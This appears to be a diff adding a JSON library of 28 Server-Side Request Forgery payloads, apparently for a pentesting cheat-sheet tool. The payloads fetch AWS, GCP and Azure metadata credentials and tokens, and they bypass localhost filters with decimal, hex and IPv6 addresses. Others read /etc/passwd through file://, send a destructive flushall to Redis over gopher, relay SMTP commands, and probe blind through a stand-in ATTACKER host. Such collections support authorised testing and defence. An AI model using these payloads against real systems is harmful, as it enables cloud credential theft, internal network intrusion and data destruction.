@@ -1,0 +1,44 @@
+{
+  "meta": {
+    "name": "SSRF",
+    "icon": "🌐",
+    "description": "Server-Side Request Forgery payloads. Covers cloud metadata endpoints, localhost bypass techniques, protocol tricks, blind detection, and internal network probing.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 28
+  },
+  "payloads": [
+    {"id":1,"code":"http://169.254.169.254/latest/meta-data/","description":"AWS IMDSv1 metadata root — confirms SSRF and starts metadata enumeration","category":"cloud-metadata","platform":["aws"],"tags":["ssrf","aws","imds","cloud"]},
+    {"id":2,"code":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","description":"AWS IAM role enumeration — lists roles attached to EC2 instance","category":"cloud-metadata","platform":["aws"],"tags":["ssrf","aws","iam","credentials"]},
+    {"id":3,"code":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME","description":"AWS temporary credential theft — fetches AccessKeyId, SecretAccessKey, Token for named role","category":"cloud-metadata","platform":["aws"],"tags":["ssrf","aws","iam","credentials","sensitive"]},
+    {"id":4,"code":"http://169.254.169.254/latest/user-data","description":"AWS EC2 user-data — often contains bootstrap scripts with credentials","category":"cloud-metadata","platform":["aws"],"tags":["ssrf","aws","user-data","sensitive"]},
+    {"id":5,"code":"http://metadata.google.internal/computeMetadata/v1/","description":"GCP metadata endpoint — requires Metadata-Flavor: Google header (may bypass in SSRF)","category":"cloud-metadata","platform":["gcp"],"tags":["ssrf","gcp","metadata","cloud"]},
+    {"id":6,"code":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token","description":"GCP service account token — fetches OAuth2 access token for default service account","category":"cloud-metadata","platform":["gcp"],"tags":["ssrf","gcp","service-account","token","sensitive"]},
+    {"id":7,"code":"http://169.254.169.254/metadata/instance?api-version=2021-02-01","description":"Azure IMDS endpoint — instance metadata including managed identity credentials","category":"cloud-metadata","platform":["azure"],"tags":["ssrf","azure","imds","cloud"]},
+    {"id":8,"code":"http://100.100.100.200/latest/meta-data/","description":"Alibaba Cloud ECS metadata endpoint","category":"cloud-metadata","platform":["alibaba"],"tags":["ssrf","alibaba","imds","cloud"]},
+
+    {"id":9,"code":"http://localhost/","description":"Localhost probe — accesses services bound to 127.0.0.1 not reachable externally","category":"localhost-bypass","platform":["any"],"tags":["ssrf","localhost","basic"]},
+    {"id":10,"code":"http://127.0.0.1/","description":"Direct 127.0.0.1 probe","category":"localhost-bypass","platform":["any"],"tags":["ssrf","localhost","basic"]},
+    {"id":11,"code":"http://127.0.0.1:8080/admin","description":"Localhost admin panel — common internal admin port","category":"localhost-bypass","platform":["any"],"tags":["ssrf","localhost","admin","8080"]},
+    {"id":12,"code":"http://0.0.0.0/","description":"0.0.0.0 localhost bypass — resolves to localhost on many systems","category":"localhost-bypass","platform":["any"],"tags":["ssrf","localhost","bypass"]},
+    {"id":13,"code":"http://[::1]/","description":"IPv6 loopback — bypasses filters checking for '127.0.0.1' or 'localhost' strings","category":"localhost-bypass","platform":["any"],"tags":["ssrf","localhost","ipv6","bypass"]},
+    {"id":14,"code":"http://2130706433/","description":"Decimal IP for 127.0.0.1 — 127*16777216+0*65536+0*256+1 = 2130706433","category":"localhost-bypass","platform":["any"],"tags":["ssrf","localhost","decimal-ip","bypass"]},
+    {"id":15,"code":"http://0x7f000001/","description":"Hex IP for 127.0.0.1 — 0x7f=127, 0x00=0, 0x00=0, 0x01=1","category":"localhost-bypass","platform":["any"],"tags":["ssrf","localhost","hex-ip","bypass"]},
+    {"id":16,"code":"http://127.1/","description":"Short IPv4 notation — 127.1 resolves to 127.0.0.1 on most systems","category":"localhost-bypass","platform":["any"],"tags":["ssrf","localhost","short-ip","bypass"]},
+
+    {"id":17,"code":"file:///etc/passwd","description":"File protocol LFI via SSRF — reads local files if file:// scheme is allowed","category":"protocol-tricks","platform":["linux"],"tags":["ssrf","file","lfi","protocol"]},
+    {"id":18,"code":"dict://127.0.0.1:6379/info","description":"SSRF to Redis via dict:// — reads Redis INFO output; can be used for Redis RCE","category":"protocol-tricks","platform":["any"],"tags":["ssrf","dict","redis","protocol"]},
+    {"id":19,"code":"gopher://127.0.0.1:6379/_%2a1%0d%0a%248%0d%0aflushall%0d%0a","description":"Gopher to Redis SSRF — sends raw Redis commands (flushall) via gopher protocol","category":"protocol-tricks","platform":["any"],"tags":["ssrf","gopher","redis","protocol","destructive"]},
+    {"id":20,"code":"gopher://127.0.0.1:25/xHELO localhost%0d%0aMAIL FROM:...","description":"Gopher to SMTP SSRF — sends raw SMTP commands to internal mail server","category":"protocol-tricks","platform":["any"],"tags":["ssrf","gopher","smtp","protocol"]},
+    {"id":21,"code":"http://ATTACKER/redirect.php?url=http://169.254.169.254/","description":"Open redirect-chained SSRF — redirector bounces to internal metadata endpoint","category":"protocol-tricks","platform":["any"],"tags":["ssrf","redirect","chain","bypass"]},
+
+    {"id":22,"code":"http://ATTACKER/","description":"Blind SSRF probe — confirm via HTTP access log on attacker server","category":"blind","platform":["any"],"tags":["ssrf","blind","oob","detection"]},
+    {"id":23,"code":"http://UNIQUE.ATTACKER/","description":"Blind SSRF DNS probe — use unique subdomain to correlate DNS lookup in logs","category":"blind","platform":["any"],"tags":["ssrf","blind","dns","detection"]},
+    {"id":24,"code":"http://169.254.169.254@ATTACKER/","description":"URL credential bypass — @ makes server parse ATTACKER as host, leaking path to logs","category":"blind","platform":["any"],"tags":["ssrf","blind","bypass","at-sign"]},
+
+    {"id":25,"code":"http://192.168.0.1/","description":"Common gateway probe — tests internal RFC1918 network access","category":"internal-network","platform":["any"],"tags":["ssrf","internal","rfc1918","probe"]},
+    {"id":26,"code":"http://10.0.0.1/","description":"Internal 10.x.x.x network probe","category":"internal-network","platform":["any"],"tags":["ssrf","internal","rfc1918","probe"]},
+    {"id":27,"code":"http://172.16.0.1/","description":"Internal 172.16.x.x network probe","category":"internal-network","platform":["any"],"tags":["ssrf","internal","rfc1918","probe"]},
+    {"id":28,"code":"http://internal-service.corp/api/v1/users","description":"Internal service enumeration — tests access to internal APIs by hostname","category":"internal-network","platform":["any"],"tags":["ssrf","internal","api","hostname"]}
+  ]
+}
